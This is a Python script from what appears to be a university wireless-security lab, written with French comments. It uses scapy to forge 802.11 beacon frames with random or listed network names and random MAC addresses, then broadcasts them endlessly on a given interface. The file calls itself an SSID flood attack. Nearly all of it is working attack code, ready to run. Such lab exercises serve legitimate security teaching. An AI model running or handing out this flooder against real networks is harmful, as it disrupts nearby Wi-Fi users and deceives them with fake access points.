'''
SWI - Labo1
Auteurs : Edin Mujkanovic et Daniel Oliviera Paiva
But : Permet de générer des wifis aléatoires
'''

from scapy.all import *
import argparse
import string

from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

generate = False
nbToGenerate = None
file = None


# Source : https://pynative.com/python-generate-random-string/
def randomString(stringLength=10):
    '''
    Fonction permettant de générer une chaine aléatoire
    :param stringLength: Longueur des chaines de caractères à générés aléatoirement
    :return: retourne la chaine de caractères aléatoire
    '''
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def attack(wifiNames, interface):
    '''
    Methode permettant de lancer l'attaque qui génére des wifis aléatoires
    :param fileName: fichier contenant les noms des wifis à générer
    :param interface: interface utilisée pour envoyer les paquets
    :param nbToGenerate: nombre de nom à générer
    :return:
    '''

    frames = []

    print("Wifi Names to generate: ")
    print(wifiNames)
    print("Generating the frames....")
    # Generation des frames
    for w in wifiNames:
        randomMac = RandMAC()
        frames.append(generateFrame(w, randomMac))
    print("Starting the attack.... (CTRL + C TO ABORT)")
    #On envoit les packets en boucle, à intervalle de 0.00001
    sendp(frames, inter=0.00001, iface=interface, loop=1)

def generateFrame(wifiName, macAddr):
    '''
    Méthode permettant de générer une frame
    :param wifiName: le nom du wifi
    :param macAddr: adresse mac source
    :return: la frame créée
    '''

    #creation de la frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=macAddr, addr3=macAddr)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=wifiName, len=len(wifiName))
    frame = RadioTap() / dot11 / beacon / essid
    return frame
#
if __name__== "__main__":
    #On recupere les differents arguments passes en parametre
    parser = argparse.ArgumentParser(description='SSID flood attack script.')
    parser.add_argument("--file", required=False, help="List containing the wifi names to generate")
    parser.add_argument("--number", required=False, help="Number of wifi to generate randomly")
    parser.add_argument("--interface", required=True, help="Interface to use to send packets")
    args = parser.parse_args()

    wifiNames = []

    # On construit la liste des noms de wifi a generer
    # Si l'argument file n'est pas spécifié, on générer le nombre demander de nom de wifi
    if args.file is None:
        for i in range(0, int(args.number)):
            wifiNames.append(randomString(10))
    # Si l'argument file est spécifié, on lit le fichier
    else:
        with open(args.file, "r") as f:
            wifiNames = f.readlines()

    #On lance l'attaque
    attack(wifiNames, args.interface)





